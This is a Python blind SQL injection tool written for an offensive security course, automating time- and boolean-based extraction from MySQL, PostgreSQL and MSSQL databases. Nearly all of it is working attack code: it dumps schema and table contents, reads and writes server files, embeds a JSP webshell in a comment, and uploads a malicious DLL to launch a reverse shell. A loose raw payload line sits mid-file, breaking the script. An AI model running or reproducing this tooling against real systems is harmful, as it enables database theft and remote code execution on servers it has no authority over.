#!/usr/bin/python3
#Cary Hooper
#Written between May and August 2020 for AWAE course (v.2.6)
#Perform Blind SQLi 

import requests
from urllib.parse import quote_plus
import sys, math, time
import binascii
import re
import linecache
from string import printable
import warnings
import os
from base64 import b64encode
warnings.filterwarnings("ignore")
start_time = time.time()
#TODO: Object orient
#TODO: Error handling
#v.2.2 adding postgresql support (blind)
#v.2.3 adding pg_write_file, pg_read_file, and pg DLL code execution via large objects
#v.2.4 changing pg reverse shell to exploit without knowledge of LOID
#v.2.5 fixed mysql bugs and adding mssql support, added time elapsed

#OPTIONS#
#Change these before attack.  You'll also have to change the do_request function to match the attack.
#If MODE is boolean, we'll have to tune the length of true/false responses.

DEBUG = True
PROXY = True
MODE = "time"
#MODE = "boolean"
DBMS = 'mysql'
#DBMS = 'pg'
#DBMS = 'mssql'
DOUBLESLEEP = False  #In case a SLEEP(1) results in a 2s delay
global target
start_time = time.time()

target = 'https://example.com'

# known_database = "amdb"
# known_table = "userpasswordtable"
#END OF OPTIONS#


#raw-----hex
def hex2raw(value):
    return binascii.unhexlify(value)
def raw2hex(value):
    return binascii.hexlify(value)

#hex-----dec
def hex2dec(value):
    return str(int(value,base=16)).encode()
def dec2hex(value):
    return ("%X" % int(value.decode())).encode()

def dec2bin(value):
    return bin(int(value.decode())).encode()[2:]
def bin2dec(value):
    return str(int(value.decode(),base=2)).encode()

def do_request(injection='SELECT(SLEEP(1))'):
	#Basic SQLi Request.  Change this.
	#Returns "requests" response object
	if PROXY:
		# proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
		proxies = {'http':'http://192.168.0.12:8080','https':'http://192.168.0.12:8080'}
	else:
		proxies = {}
	cookies = {"session":"31c3e0c31fa8de9f3707b2664f15e065"}

	data = {"session":"31c3e0c31fa8de9f3707b2664f15e065","message":"order"}
	
	#Bypass character restrictions
	#data['q'] = data['q'].replace(" ","/**/")
	# data['userId'] = pg_escape_quotes(data['userId'])
	#data['userId'] = data['userId'].replace("'","$$")
	print(data)

	response = requests.post(target,data=data,proxies=proxies,verify=False,cookies=cookies)
	return response
	#You'll also need to change the test_injection function for Boolean. 
	#Which content length(s) constitute TRUE/FALSE requests?

def log(message):
	if DEBUG:
		print(message)

def split_select(query,newpre,newpost):
	#Wraps the query object within a new function.
	queryparts = query.split(" ",2)
	newquery = f"{queryparts[0]} {newpre}{queryparts[1]}{newpost} {queryparts[2]}"
	return newquery

def split_select_mssql(query,newpre,newpost):
	#Works for mssql now
	queryparts = query.split(" ",4)
	newquery = f"{queryparts[0]} {queryparts[1]} {queryparts[2]} LEN({queryparts[3]}) {queryparts[4]}"
	return newquery

def fuckitimout():
	#log(f"Time: {time.time() - start_time}s")
	sys.exit(0)

def printException():
	exc_type, exc_obj, tb = sys.exc_info()
	f = tb.tb_frame
	lineno = tb.tb_lineno
	filename = f.f_code.co_filename
	linecache.checkcache(filename)
	line = linecache.getline(filename,lineno,f.f_globals)
	print(f"[!] Exception ({filename}, LINE {lineno} '{line.strip()}'): {exc_obj}")

def test_injection():
	if MODE == "time":
		print("[!] Beginning timing tests...")
		#Compatibility for DOUBLESLEEP where server sleeps for 2s instead of 1s.
		factor = 1
		if DOUBLESLEEP:
			factor = 2
		#Do test for SLEEP(0) to SLEEP(3)
		for sleeptime in range(0,3):
			if DBMS == 'mysql':
				sleepstring = f"SELECT(SLEEP({sleeptime}))"
			elif DBMS == 'pg':
				sleepstring = f"SELECT pg_sleep({sleeptime})"
			elif DBMS == 'mssql':
				sleepstring = f"WAITFOR DELAY '0:0:{sleeptime}'"
			else:
				print("")
			response = do_request(sleepstring)
			seconds = math.floor(response.elapsed.total_seconds())
			log(f"\tTesting SLEEP for {sleeptime} seconds")
			if seconds != (factor*sleeptime):
				if seconds == (2*sleeptime):
					print("Possible candidate for double sleep mode.")
				print(f"Failed test for {sleeptime}s.  Actual time was {seconds}s")
				fuckitimout()
	elif MODE == "boolean":
		#Make request that is TRUE
		response = do_request(f'(SELECT 1)=1')
		global true_length
		true_length = int(response.headers["Content-Length"])
		#Make request that is FALSE
		response = do_request(f'(SELECT 1)=2')
		global false_length
		false_length = int(response.headers["Content-Length"])
		if true_length == false_length:
			print(f"[!] Error: {MODE} SQL Injection not possible true_length=false_length={true_length}")
			fuckitimout()
		print(f"true_length = {true_length} | false_length = {false_length}")
	else:
		print("")
	log(f"[*] All tests completed successfully.")

def timing_data_to_ascii(timing_data):
	#From high bits to low bits
	#Given a list of seconds it took to make the requests for one character,
	#Piece together the character in binary, convert it, then return it.  
	char_binary = ""
	#Compatibility for DOUBLESLEEP Mode
	factor = 1
	if DOUBLESLEEP:
		factor = 2
	#log(f"Timing Data: {timing_data} is of type {type(timing_data)}")
	if DBMS == 'mysql':
		translator = ["00","01","10","11"]
		for time in timing_data:
			#print(f"Time {time} is of type {type(time)}")
			char_binary += translator[int(time/factor)]
	elif DBMS == 'pg':
		for time in timing_data:
			seconds = int(time/factor)
			if seconds > 1:
				seconds = 1
			char_binary += str(seconds)
	else:
		print("")
	log(f"Binary Character: {char_binary}")
	char_binary = char_binary.encode()
	char_dec = bin2dec(char_binary)
	char_hex = dec2hex(char_dec)
	character = hex2raw(char_hex).decode()
	#print(f"ASCII Character: {character}")
	return character

def get_timing_data_helper(queries):
	#Takes in a list of queries and responds with a list of timing data.
	timing_data = list()
	do_once = True
	for timing_query in queries:
		if do_once:
			log(f"Doing timing request: {timing_query}")
			do_once = False
		response = do_request(timing_query)
		seconds = math.floor(response.elapsed.total_seconds())
		#print(f"Request took {seconds} seconds.")
		timing_data.append(seconds)
	log(f"Returning from get_timing_data_helper: {timing_data}")
	return timing_data

def get_timing_data_pg(query):
	queries = list()
	for bit in range(1,9):
		nextquery = split_select(query,"ascii(",")::bit(8)")
		nextquery = split_select(nextquery,"substr(",f"::text,{bit},1)")
		queries.append(f"SELECT CASE WHEN ({nextquery})='1' THEN pg_sleep(1) ELSE pg_sleep(0) END")

	timing_data = get_timing_data_helper(queries)
	return timing_data

def get_timing_data_mysql(query):
	timing_data = list()
	query_fuel = [(128,64),(32,16),(8,4),(2,1)]
	queries = list()
	for largemask,smallmask in query_fuel:
		nextquery = f"SELECT IF(ORD(SUBSTR(BINARY({query}),1,1))&{largemask}=0,SLEEP(0),SLEEP(2)))"
		nextquery += f" OR (SELECT IF(ORD(SUBSTR(BINARY({query}),1,1))&{smallmask}=0,SLEEP(0),SLEEP(1))"
		queries.append(nextquery)

	#WORKS (2s)
	#select * from cengbox.admin WHERE username = 'masteradmin' AND (
	# SELECT IF(ORD(SUBSTR(BINARY(LENGTH(BINARY( SELECT COUNT(*) FROM information_schema.SCHEMATA ))),1,1))&16=0,SLEEP(0),SLEEP(1))
	# ) OR (
	# SELECT IF(ORD(SUBSTR(BINARY(LENGTH(BINARY( SELECT COUNT(*) FROM information_schema.SCHEMATA ))),1,1))&32=0,SLEEP(0),SLEEP(1)) 
	# );#

	timing_data = get_timing_data_helper(queries)
	#print(f"Timing Data:{timing_data}")
	return timing_data

def get_timing_data_mssql(query):
	timing_data = list()
	query_fuel = [(128,64),(32,16),(8,4),(2,1)]
	queries = list()
	for largemask,smallmask in query_fuel:
		# IF (((QUERY)&2)+	((QUERY)&1)=3) BEGIN WAITFOR DELAY '0:0:3' END 
		# ELSE IF (((QUERY)&2)+((QUERY)&1)=2) BEGIN WAITFOR DELAY '0:0:2' END 
		# ELSE IF (((QUERY)&2)+((QUERY)&1)=1) BEGIN WAITFOR DELAY '0:0:1' END 
		# ELSE BEGIN WAITFOR DELAY '0:0:0' END
		nextquery =        f"IF ((({query})&{largemask})+(({query})&{smallmask})={smallmask+largemask}) BEGIN WAITFOR DELAY '0:0:3' END"
		nextquery += f" ELSE IF ((({query})&{largemask})+(({query})&{smallmask})={largemask}) BEGIN WAITFOR DELAY '0:0:2' END"
		nextquery += f" ELSE IF ((({query})&{largemask})+(({query})&{smallmask})={smallmask}) BEGIN WAITFOR DELAY '0:0:1' END"
		nextquery += f" ELSE BEGIN WAITFOR DELAY '0:0:0' END"
		queries.append(nextquery)

	timing_data = get_timing_data_helper(queries)

def boolean_check_character(character_int,operator,query):
	#log(f"Incoming to boolean_check_character: {query}")
	if query[0:6] == "SELECT":
		#Take the second word and wrap ASCII around it.
		query = split_select(query,"ASCII(",f"){operator}{character_int}")
	else:
		query = f"SELECT ASCII({query}){operator}{character_int}"
	#log(f"Actual query: {query}")
	#log(f"Checking {character_int} with query: {query}")
	response = do_request(query)
	length = int(response.headers["Content-Length"])
	#log(f"Content-Length is {length}")
	if length > false_length:
		#log(f"Length for {character_int} matched true_length ({length})")
		return True
	elif length == false_length:
		return False
	else:
		log(f"[!] New length detected! length is {length}")
		fuckitimout()

def boolean_logic_tree(guess,hi,lo,query):
	#Recursive function to bracket the actual number
	if boolean_check_character(guess,">",query):
		lo = guess
		newguess = round((hi + lo)/2) #Rounds down
		answer = boolean_logic_tree(newguess,hi,lo,query)
	elif boolean_check_character(guess,"<",query):
		hi = guess
		newguess = round((hi + lo)/2) #Rounds down
		answer = boolean_logic_tree(newguess,hi,lo,query)
	elif boolean_check_character(guess,"=",query):
		#log(f"Found matching int {guess} (aka {chr(guess)})")
		return guess
	else:
		print("No valid character found.")
		fuckitimout()
	return answer

def find_character(query):
	#log(f"Entering find_character with: {query}")
	if MODE == "time":
		if DBMS == "mysql":
			timing_data = get_timing_data_mysql(query)
		elif DBMS == 'pg':
			timing_data = get_timing_data_pg(query)
		elif DBMS == 'mssql':
			timing_data = get_timing_data_mssql(query)
		else:
			print("")
		character = timing_data_to_ascii(timing_data)
		return character
	else:
		#MODE == "boolean"
		hi = 125
		lo = 32
		number = boolean_logic_tree(round(((hi+lo)/2)),hi,lo,query)
		#log(f"find_character returning {chr(number)}")
		return chr(number)

def find_length(base_query,count=False):
	#Takes in a query and finds the length of the result. Needs to return multi-digit nums if needed.
	log(f"Entering find_length: {base_query}")
	if DBMS == 'mysql':
		length_query = split_select(base_query,"LENGTH(BINARY(","))")
		super_length_query = split_select(length_query,"LENGTH(BINARY(","))")
	elif DBMS == 'pg':
		length_query = split_select(base_query,"LENGTH(","::text)::text")
		super_length_query = split_select(length_query,"LENGTH(",")::text")
	elif DBMS == 'mssql':
		if count:
			length_query = split_select(base_query,"LEN(",")")
			super_length_query = split_select(length_query,"LEN(",")")
		else:
			length_query = split_select_mssql(base_query,"LEN(",")")
			super_length_query = split_select_mssql(length_query,"LEN(",")")
	else:
		print("")
	#Remove SELECT from length queries
	#length_query = length_query.split(" ",1)[1]
	#log(f"find_length query: {length_query}")
	#SELECT LENGTH(BINARY(SELECT COUNT(*) FROM information_schema.SCHEMATA));

	#Essentially finding the length of the length (so we know how many digits to iterate).
	#log(f"find_super length query: {super_length_query}")
	#SELECT SUBSTR(LENGTH(BINARY(SELECT COUNT(*) FROM information_schema.SCHEMATA)),1,1);
	#super_length_query = super_length_query.split(" ",1)[1]
	log(f"Executing super_length_query: {super_length_query}")
	digits = find_character(super_length_query)
	log(f"Digits is {digits}")
	digits = int(digits)
	length = ""
	
	#Fails here.
	for digit in range(1,digits + 1):
		if DBMS == 'mysql':
			this_query = split_select(length_query,"SUBSTR(",f",{digit},1)")
			#this_query = f"SUBSTR({length_query},{digit},1)"
		elif DBMS == 'pg':
			this_query = split_select(length_query,"SUBSTR(",f",{digit},1)")
		elif DBMS == 'mssql':
			this_query = split_select_mssql(length_query,"substring(",f",{digit},1")
		else:
			print("")
		log(f"Executing length_query: {this_query}")
		nextdigit = find_character(this_query)
		length += nextdigit
		log(f"Next digit: {nextdigit}")

	length = int(length)
	return length

def count_things(thing_name,database="information_schema",table=""):
	print(f"[*] Counting number of {thing_name}s.")
	#This if...elif...else statement to select which query results in the correct count
	if DBMS == "mysql":
		if thing_name == "database":
			base_query = f"SELECT COUNT(*) FROM information_schema.SCHEMATA"
			base_query += " WHERE SCHEMA_NAME != 'sys'"
			base_query += " AND SCHEMA_NAME != 'information_schema'"
			base_query += " AND SCHEMA_NAME != 'mysql'"
			base_query += " AND SCHEMA_NAME != 'performance_schema'"
		elif thing_name == "table":
			base_query = f"SELECT COUNT(table_name) FROM information_schema.tables"
			base_query += f" WHERE table_schema = '{database}'"
		elif thing_name == "column":
			base_query = f"SELECT COUNT(column_name) FROM information_schema.columns"
			base_query += f" WHERE table_name = '{table}'"
		elif thing_name == "entry":
			base_query = f"SELECT COUNT(*) FROM {database}.{table}"
		else:
			#Error handling for wrong input
			print(f"[!] Error: Improper thing_name ({thing_name}) submitted to count_things function.")
	elif DBMS == "pg":
		if thing_name == "database":
			base_query = f"SELECT COUNT(datname) FROM pg_database"
			base_query += " WHERE datname != 'postgres'"
			base_query += "AND datname != 'template0'"
			base_query += "AND datname != 'template1'"
		elif thing_name == "table":
			base_query = f"SELECT COUNT(table_name) FROM information_schema.tables"
			base_query += f" WHERE table_catalog = '{database}'"
			base_query += " AND table_schema != 'pg_catalog'"
			base_query += " AND table_schema != 'information_schema'"
		elif thing_name == "column":
			base_query = f"SELECT COUNT(column_name) FROM information_schema.columns WHERE table_name = '{table}'"
		elif thing_name == "entry":
			base_query = f"SELECT COUNT(*) FROM {table}"
		else:
			#Error handling for wrong input
			print(f"[!] Error: Improper thing_name ({thing_name}) submitted to count_things function.")
	elif DBMS == "mssql":
		if thing_name == "database":
			base_query = "SELECT COUNT(name) FROM master..sysdatabases WHERE name != 'model'"
			base_query += " AND name != 'msdb' AND name != 'tempdb' AND name != 'master'"
		elif thing_name == "table":
			base_query = f"SELECT COUNT(name) FROM {database}..sysobjects WHERE xtype = 'U'"
		elif thing_name == "column":
			base_query = f"SELECT COUNT({database}..syscolumns.name) FROM {database}..syscolumns,{database}..sysobjects WHERE {database}..syscolumns.id={database}..sysobjects.id AND {database}..sysobjects.name='{table}'"
		elif thing_name == "entry":
			base_query = f"SELECT COUNT(*) FROM {database}..{table}"
		else:
			print(f"[!] Error: Improper thing_name ({thing_name}) submitted to count_things function.")
	else:
		print("")
	#h00p 7:23 6/20 I believe split_select function deprecates the need for this logic (dreadful)
	#Find thing within COUNT(thing) to supply to the .replace function below
	# matches_of_count_object = re.findall(r'\((.+?)\)',base_query)
	# if len(matches_of_count_object) == 1:
	# 	count_object = matches_of_count_object[0]
	# else:
	# 	print(f"[!] Error: Found multiple items between '(' and ')'.  Not expected...")
	# 	for i in matches_of_count_object:
	# 		print(f"\t{i}")
	# 		print(base_query)


	#Find number of digits of count_things
	digits = find_length(base_query,count=True)
	number_string = ""
	#For each digit, find the numeric character.
	for digit in range(1,digits+1):
		if DBMS == "mysql":
			this_query = split_select(base_query,"SUBSTR(",f",{digit},1)")
		elif DBMS == "pg":
			if "COUNT" not in base_query:
				this_query = split_select(base_query,"SUBSTR(",f",{digit},1)")
			else:
				this_query = split_select(base_query,"SUBSTR(",f"::text,{digit},1)")

		else:
			print("")

		number_digit = find_character(this_query)
		number_string += number_digit
	print(f"\t[*] There is/are {number_string} {thing_name}(s).")
	return int(number_string)

def list_things(thing_name,database="information_schema",table="",columns=[],number_of_things=1):
	log(f"[*] Listing {thing_name}.")
	if DBMS == "mysql":
		if thing_name == "database":
			base_query = f"SELECT SCHEMA_NAME FROM information_schema.SCHEMATA"
			base_query += " WHERE SCHEMA_NAME != 'sys'"
			base_query += "AND SCHEMA_NAME != 'information_schema'"
			base_query += "AND SCHEMA_NAME != 'mysql'"
			base_query += "AND SCHEMA_NAME != 'performance_schema'"
		elif thing_name == "table":
			base_query = f"SELECT table_name FROM information_schema.tables WHERE table_schema = '{database}'"
		elif thing_name == "column":
			base_query = f"SELECT column_name FROM information_schema.columns WHERE table_name = '{table}'"
			base_query += f"AND table_schema = '{database}'"
		elif thing_name == "entry":
			base_query = ""
		else:
			#Error handling for wrong input
			print(f"[!] Error: Improper thing_name ({thing_name}) submitted to count_things function.")

	elif DBMS == "pg":
		if thing_name == "database":
			base_query = f"SELECT datname FROM pg_database"
			base_query += " WHERE datname != 'postgres'"
			base_query += "AND datname != 'template0'"
			base_query += "AND datname != 'template1'"
		elif thing_name == "table":
			base_query = f"SELECT table_name FROM information_schema.tables"
			base_query += f" WHERE table_catalog = '{database}'"
			base_query += " AND table_schema != 'pg_catalog'"
			base_query += " AND table_schema != 'information_schema'"
		elif thing_name == "column":
			base_query = f"SELECT column_name FROM information_schema.columns WHERE table_name = '{table}'"
		elif thing_name == "entry":
			base_query = ""
		else:
			#Error handling for wrong input
			print(f"[!] Error: Improper thing_name ({thing_name}) submitted to count_things function.")
	elif DBMS == "mssql":
		if thing_name == "database":
			base_query = "SELECT name FROM master..sysdatabases WHERE name != 'model'"
			base_query += " AND name != 'msdb' AND name != 'tempdb' AND name != 'master'"
		elif thing_name == "table":
			base_query = f"SELECT name FROM {database}..sysobjects WHERE xtype = 'U'"
		elif thing_name == "column":
			base_query = f"SELECT {database}..syscolumns.name FROM {database}..syscolumns,{database}..sysobjects WHERE {database}..syscolumns.id={database}..sysobjects.id AND {database}..sysobjects.name='{table}'"
		elif thing_name == "entry":
			base_query = f"SELECT * FROM {database}..{table}"
		else:
			print(f"[!] Error: Improper thing_name ({thing_name}) submitted to count_things function.")
	#Find the schema_name, table_name,column_name, etc.
	else:
		print("")
	collected_things = list()

	log(f"DBMS is {DBMS} and base_query is {base_query}")

	for iteration in range(0,number_of_things):
		#Perform this for each thing... find name
		log(f"\t[*] Enumerating {thing_name} #{iteration}")
		query_with_offset = f"{base_query} LIMIT 1 OFFSET {iteration}"
		thing_name_length = find_length(query_with_offset)

		this_thing_name = ""
		for character_number in range(1,thing_name_length +1):
			#Database
			this_query = split_select(query_with_offset,"SUBSTR(",f",{character_number},1)")
			character = find_character(this_query)
			this_thing_name += character
			print(f"\tFound: {this_thing_name}", end="\r", flush=True)
		print("")
		collected_things.append(this_thing_name)
	return collected_things

def list_entries(database,table,columns,number_of_entries):
	log(f"[*] Listing entries in {database}.{table}")
	entries = list()
	for entry in range(0,number_of_entries):
		#Loop through each entry
		log(f"\t[*] Attempting to retrieve entry #{entry}")
		this_entry = list()
		for col in columns:
			#For each column, grab the data
			log(f"\t[*] Retrieving {col} from entry #{entry}")
			#For listing entries, we create our own query.
			if DBMS == 'mysql':
				this_query = f"SELECT {col} FROM {database}.{table} LIMIT 1 OFFSET {entry}"
			elif DBMS == 'pg':
				this_query = f"SELECT {col} FROM {table} LIMIT 1 OFFSET {entry}"
			elif DBMS == 'mssql':
				#SELECT TOP 1 name FROM (SELECT TOP 19 name FROM pwndepot..tools ORDER BY name) sub ORDER BY name DESC;
				this_query = f"SELECT TOP 1 {col} FROM (SELECT TOP {entry} {col} FROM {database}..{table} ORDER BY {col}) sub ORDER BY {col} DESC"
			field_length = find_length(this_query)
			log(f"\t\t[*] Field {col} is {field_length} char long for entry #{entry}")

			#log(f"Character Query: {char_query}")
			this_entry_value = ""
			for character_number in range(1,field_length+1):
				if DBMS == 'mysql':
					next_query = split_select(this_query,f"SUBSTR(",f",{character_number},1)")
				elif DBMS == 'pg':
					next_query = split_select(this_query,f"SUBSTR(",f"::text,{character_number},1)")
				elif DBMS == 'mssql':
					#SELECT TOP 1 name FROM (SELECT TOP 19 name FROM pwndepot..tools ORDER BY name) sub ORDER BY name DESC;
					next_query = split_select(this_query,f"substring(",f",{character_number},1)")
				else:
					fuckitimout()
				log(f"List Entries (find_character): {next_query}")
				character = find_character(next_query)
				this_entry_value += character
				print(f"\t\tFound: {this_entry_value}", end="\r", flush=True)
			print("")
			this_entry.append(this_entry_value)
		entries.append(this_entry)
	return entries

1337 UNION (SELECT IF(ORD(SUBSTR(BINARY(SELECT LENGTH(BINARY(LENGTH(BINARY(id)))) from users where isAdmin = 0 limit 1),1,1))&128=0,SLEEP(0),SLEEP(2))) 
OR 
(SELECT IF(ORD(SUBSTR(BINARY(SELECT LENGTH(BINARY(LENGTH(BINARY(id)))) from users where isAdmin = 0 limit 1),1,1))&64=0,SLEEP(0),SLEEP(1)))

# def list_single_entry(database,table,column,qualifier):
	# this_entry = ""
	# log(f"[*] Listing single entry {table} ({column} {qualifier})")
	# query = f"SELECT {column} from {table} {qualifier}"
	# entry_length = find_length(query)
	# for character_number in range(1,entry_length + 1):
	# 	this_query = split_select(query,"SUBSTR(",f",{character_number},1)")
	# 	character = find_character(this_query)
	# 	this_entry += character
	# 	print(f"\t\tFound: {this_entry}", end="\r", flush=True)
	# print("")
	# return this_entry

def pg_check_value(query,value):
	#Checks if the result of a query is value. 
	#Example: SELECT current_setting('is_superuser');
	query = "SELECT current_setting('is_superuser')"
	boolean_query = f"SELECT CASE WHEN ({query})='{value}' THEN pg_sleep(2) ELSE pg_sleep(0) END"
	response = do_request(boolean_query)
	seconds = math.floor(response.elapsed.total_seconds())
	if seconds > 1:
		return True
	else:
		return False

def prettify_results(results):
	print("----------- Summary of Results -----------")
	#Example Results
	#{'cengbox': [{'admin' : {'columns': ['id', 'username', 'password'], 'entries': [['1', 'masteradmin', 'C3ng0v3R00T1!']]}}]}
	from prettytable import PrettyTable

	for database,tables_list in results.items():
		for table in tables_list:
			for table_name,table_dict in table.items():
				#For each table...
				for field,contents in table_dict.items():
					#print(f"field is {field} of type {type(field)}")
					#print(f"contents is {contents} of type {type(contents)}")
					pt = PrettyTable()
					if field == 'columns':
						log(f"Assigning columns: {contents}")
						pt.field_names = contents
					if field == 'entries':
						for entry in contents:
							log(f"(Assigning row: {entry}")
							pt.add_row(entry)
				pt.title = f"{database}.{table_name}"
				print(pt)

				# Traceback (most recent call last):
				#   File "sqli.py", line 368, in <module>
				#     prettify_results(results)
				#   File "sqli.py", line 306, in prettify_results
				#     table.field_names = table_info_dict["columns"]
				# TypeError: list indices must be integers or slices, not str

def dump_table(database,table):
	#prepare table entry in results ({"columns":list_of_col,"entries":list_of_list_of_entries})
	table_dict = dict()
	
	#Enumerate columns
	number_of_cols = count_things("column",database=database,table=table)
	columns = list_things("column",database=database,table=table,number_of_things=number_of_cols)
	log(f"\t\tColumns: {columns}")


	table_dict["columns"] = columns
	print(table_dict["columns"])

	#Enumerate entries in table
	number_of_entries = count_things("entry", database=database,table=table)
	entries = list_entries(database,table,columns,number_of_entries)
	table_dict["entries"] = entries

	return table_dict

def pg_write_file(target_location,file_content=False,local_path=False,base64content=False):
	#CREATE TEMP TABLE h00p(content text);INSERT INTO h00p(content) VALUES ((select convert_from(decode('TXkgTmFtZSBpcyBDYXJ5ClRoaXMgaXMgZm9yIEFXQ
	#UUKVGhpcyBpcyBhIGhhaWt1Cg==','base64'),'UTF-8')));COPY h00p(content) to 'C:\Users\Administrator\Desktop\test.txt'; DROP table h00p;
	#Note: webroot in C:\Program Files (x86)\ManageEngine\AppManager12\working\
	#jsp webshell <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
	#PCUgUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikpOyAlPg==
	#note: for ME, < and > are html entity-encoded
	query = f"CREATE TEMP TABLE h00p(content text);"
	
	if base64content or local_path:
		if local_path:
			f = open(local_path,'r')
			filecontents = f.read()
			base64content = b64encode(filecontents).decode()
		query += f"INSERT INTO h00p(content) VALUES ((select convert_from(decode('{base64content}','base64'),'UTF-8')));"
	elif file_content:
		query += f"INSERT INTO h00p(content) VALUES ('{file_content}');"
	else:
		print("pg_write_file failed.  Needs file_content or base64content populated.")
		fuckitimout()

	query += f"COPY h00p(content) to '{target_location}'; DROP table h00p"
	log(f"Writing content to {target_location}")
	response = do_request(query)

def pg_read_file(file_location,start_line=0,num_lines=False):
	#note: This fails due to inconsistencies in the target web server... different responses are given for the same requests.
	#update: turns out it takes the server a few seconds to create/drop a temporary table.  Subsequent calls to the same
	#table will fail.  To mitigate, we use a unique temp table for every request.

	#to retrieve a portion of the file, specify start_line (zero-indexed line of file) and num_lines (lines to read)
	tailnum = 0
	count_things_query = "SELECT COUNT(*) FROM h00pTAILNUM"
	list_entries_query = "SELECT content FROM h00pTAILNUM LIMIT 1 OFFSET THIS_ENTRY_NUMBER"

	#As an exercise, re-implementing SQLi logic on a micro scale
	base_query =  f"CREATE TEMP TABLE h00pTAILNUM (content text);"
	base_query += f"COPY h00pTAILNUM FROM '{file_location}';"
	base_query += "QUERY_TO_EXECUTE"
	base_query += f"; DROP table h00pTAILNUM"

	if not num_lines:
		#Find # lines in file
		for length in range(1,1000):
			length_guess_query = f"SELECT CASE WHEN ({count_things_query})={length} THEN pg_sleep(2) ELSE pg_sleep(0) END"
			this_query = base_query.replace("QUERY_TO_EXECUTE",length_guess_query)
			this_query = this_query.replace("TAILNUM",str(tailnum))
			response = do_request(this_query)
			tailnum += 1
			log(f"Time for {length}: {response.elapsed.total_seconds()}s")
			if response.elapsed.total_seconds() > 1:
				print(f"[*] There are {length} lines in the file {file_location}")
				num_lines = length
				break
	else:
		print("")
	#Find lines
	lines = list()
	for line in range(start_line,start_line + num_lines):
		this_line_query = list_entries_query.replace("THIS_ENTRY_NUMBER",str(line))
		this_line_length_query = split_select(this_line_query,"LENGTH(",")")
		#Find #characters in line
		for length in range(1,1000):
			this_length_guess_query = f"SELECT CASE WHEN ({this_line_length_query})={length} THEN pg_sleep(2) ELSE pg_sleep(0) END"
			this_length_guess_query = base_query.replace("QUERY_TO_EXECUTE", this_length_guess_query)
			this_length_guess_query = this_length_guess_query.replace("TAILNUM",str(tailnum))

			response = do_request(this_length_guess_query)
			tailnum += 1
			if response.elapsed.total_seconds() > 1:
				log(f"[*] There are {length} characters in line {line}.")
				line_length = length
				break
		
		log("[*] Finding characters...")
		this_line = ""
		#For each character, find the character
		for character in range(1,line_length + 1):
			this_character_query = split_select(this_line_query,"ASCII(SUBSTR(",f",{character},1))")
			#Find the character in position {character}
			for guess in range(32,127):
				this_character_guess_query = f"SELECT CASE WHEN ({this_character_query})={guess} THEN pg_sleep(2) ELSE pg_sleep(0) END"
				this_character_guess_query = base_query.replace("QUERY_TO_EXECUTE",this_character_guess_query)
				this_character_guess_query = this_character_guess_query.replace("TAILNUM",str(tailnum))
				response = do_request(this_character_guess_query)
				tailnum += 1
				if response.elapsed.total_seconds() > 1:
					log(f"[*] Character {character} is {chr(guess)}.")
					this_character = chr(guess)
					this_line += this_character
					length = 126
		print(f"[*] Found line {line}: {this_line}")
		lines.append(this_line)

	log(lines)
	for line in lines:
		print(line)
	return lines

def pg_extension_shell(filepath,outputloc):
	#Thanks to mr_me.  https://srcincite.io/blog/2020/06/26/sql-injection-double-uppercut-how-to-achieve-remote-code-execution-against-postgresql.html
	fn_name = "test"
	#loid = 1337
	loid_pre = "(select loid from pg_largeobject WHERE data LIKE '; for 16%')"
	loid_post = "(select loid from pg_largeobject WHERE data LIKE 'MZ%')"
	#First delete any old LOID that may be lingering.
	#delete_loid_query = f"SELECT lo_unlink({loid})"
	#do_request(delete_loid_query)
	
	#Next, create an arbitrary LOID.
	#create_loid_query = f"SELECT lo_import('C:\\Windows\\win.ini',{loid})"
	create_loid_query = f"SELECT lo_import('C:\\Windows\\win.ini')"
	do_request(create_loid_query)

	#Open malicious DLL, find size and split into 2048 byte chunks
	f = open(filepath,'rb')
	filecontents = f.read()
	size = len(filecontents)
	remainder = size % 2048
	iterations = int(size / 2048)

	#In parts, upload the DLL chunks as hex bytes.  
	for i in range(0,iterations):
		log(f"Sending part {i}")
		part = filecontents[2048*i:2048*(i+1)]
		hexpart = raw2hex(part).decode()
		log(f"First {hexpart[0:10]} -- Last {hexpart[-10:]}")
		#Different queries for the first chunk as the rest
		if i == 0:
			add_part_query = f"UPDATE pg_largeobject SET data=decode('{hexpart}','hex') WHERE loid={loid_pre} AND pageno={i}"
			#UPDATE pg_largeobject SET data='foobarh00p' WHERE loid=(SELECT lo_import('C:\Windows\win.ini')) AND pageno=0
		else:
			add_part_query = f"INSERT INTO pg_largeobject(loid,pageno,data) values ({loid_post},{i},decode('{hexpart}'::text,'hex'))"
		do_request(add_part_query)

	log(f"Exporting LOID")
	#Saving the DLL to the filesystem.
	export_loid_query = f"SELECT lo_export({loid_post},'{outputloc}')"
	do_request(export_loid_query)
	#Create a UDF that calls the DLL
	udf_function_query = f"CREATE OR REPLACE FUNCTION test(text,integer) RETURNS void as '{outputloc}','revshell' LANGUAGE 'c' STRICT"
	do_request(udf_function_query)
	#This particular payload is hardcoded in the DLL.  Invoke the UDF.  
	revshell_query = f"SELECT test('127.0.0.1',4444)"
	log("Sending reverse shell!")
	do_request(revshell_query)

results = dict()
#Results Schema.  {'db1':[{'table1':{'cols':[],'entries':[[],[],...}},{'table2':{'cols':[],'entries':[[],[],...}}]}
#db_name is the dict KEY =>
#						   VALUE: list of table dicts []
#    							Each table name is a dict KEY (and value of a database) =>
#	     The values of the table dict are a dict with two keys
#	         KEY "columns" => list []
#		     KEY "entries" => list of lists [[],[],...]
#					


#Test.  For boolean, sets TRUE/FALSE thresholds
test_injection()

#Check for limited dump
try: 
	if known_table and known_database:
		print(f"[*] Database {known_database} and Table {known_table} supplied. Only dumping entries from table.")
		results = dict()
		results[known_database] = list()
		next_table_dict = dict()
		try:
			next_table = dump_table(known_database,known_table)
		except Exception as e:
			print(f"[!] Error: {e}")
			printException()
			fuckitimout()

		next_table_dict[known_table] = next_table
		results[known_database].append(next_table_dict)
		print(results)
		prettify_results(results)
		fuckitimout()
except Exception as e:
	print(f"[*] known_table and known_database not supplied.  going in blind...")

#Enumerate DBs
try:
	databases = list()
	databases.append(known_database)
except:	
	number_of_databases = count_things("database")
	databases = list_things("database",number_of_things=number_of_databases)
	log(f"Databases: {databases}")



for database in databases:
	#Prepare entry in results (database --> [table1,table2])
	results[database] = list()
	
	#Enumerate tables
	number_of_tables = count_things("table",database=database)
	tables = list_things("table",database=database,number_of_things=number_of_tables)
	log(f"\tTables: {tables}")
	
